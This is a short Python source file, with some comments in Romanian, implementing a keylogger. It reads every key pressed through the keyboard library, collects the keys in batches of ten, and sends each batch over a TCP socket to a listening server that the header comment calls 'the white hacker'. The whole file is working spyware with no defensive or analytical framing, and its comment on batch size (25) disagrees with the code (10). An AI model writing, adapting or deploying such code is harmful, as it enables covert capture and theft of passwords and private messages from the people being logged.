#--------------------Program purpose-------------------
#we take each 25 keys and send it to the white hacker using tcp protocol

#--------------------Libraries-----------------------
import keyboard
import socket

#--------------------Variables-----------------------
buffer = [] #list of key pressed 
programRunning = True 

#--------------------Algorithm-----------------------
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #ipv4 tcp socket 
s.connect( (socket.gethostname(), 1234) )             #ne conectam la server

while programRunning: 
    keyPressed = keyboard.read_key()                  #take the key pressed at the moment 
    buffer.append(str(keyPressed))                                   #append to list of key pressed 
    #print(keyPressed)                                #debugging purpose

    if len(buffer) == 10:
        #trimitem prin tcp 
        msgToSendString = " ".join(buffer)            #convert the list into a string 
        msgToSend = bytes(msgToSendString,"utf-8")    #convert the string in bytes format
        s.send(msgToSend)                             #send it to the server
        buffer.clear()                                #clear the buffer in order to store another 10 keys 

